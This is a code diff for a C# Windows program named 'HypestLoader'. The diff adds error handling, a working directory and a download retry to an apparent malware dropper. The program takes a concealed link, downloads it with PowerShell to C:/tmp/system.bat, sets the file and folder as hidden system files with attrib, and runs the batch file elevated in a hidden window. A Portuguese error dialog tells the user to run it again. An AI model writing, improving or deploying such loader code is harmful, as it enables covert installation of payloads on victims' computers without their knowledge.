@@ -26,9 +26,18 @@ namespace HypestLoader
 
         static void DownloadFile()
         {
-            string link = HideLink.getLink();
-            string command = $"Powershell Invoke-WebRequest {link} -OutFile C:/tmp/system.bat";
-            PowerShellHandling.RunScript(command);
+            try
+            {
+                string link = HideLink.getLink();
+                string command = $"Powershell Invoke-WebRequest {link} -OutFile C:/tmp/system.bat";
+                PowerShellHandling.RunScript(command);
+            }catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                Task.Delay(500);
+                Application.Exit();
+            }
+            
 
 
         }
@@ -41,9 +50,10 @@ namespace HypestLoader
 
         static void StartBat()
         {
-            string program = "start system.bat ";
+            string program = "start system.bat";
             string hideFolder = "attrib +h +s C:\\tmp";
             string hideFile = "attrib +r +h +s system.bat";
+            string dir = @"C:\tmp\";
 
 
 
@@ -54,11 +64,11 @@ namespace HypestLoader
             cmd.StartInfo.CreateNoWindow = true;
             cmd.StartInfo.UseShellExecute = false;
             cmd.StartInfo.Verb = "runas";
+            cmd.StartInfo.WorkingDirectory = dir;
             cmd.Start();
 
             try
             {
-                cmd.StandardInput.WriteLine("cd " + @"C:\tmp\");
                 cmd.StandardInput.WriteLine(hideFile);
                 cmd.StandardInput.WriteLine(hideFolder);
                 cmd.StandardInput.WriteLine(program);
@@ -70,11 +80,12 @@ namespace HypestLoader
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.ToString());
-                Console.ReadLine();
+                MessageBox.Show(e.ToString());
+                Application.Exit();
             }
 
         }
+
         private void Form1_Load(object sender, EventArgs e)
         {
             this.progressBar1.Value = 0;
@@ -99,6 +110,7 @@ namespace HypestLoader
                 else
                 {
                     MessageBox.Show("Erro! Arquivo inexistente! Execute novamente em 5 minutos", "Arquivo não encontrado", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    DownloadFile();
                     Task.Delay(1000);
                     Application.Exit();
                 }
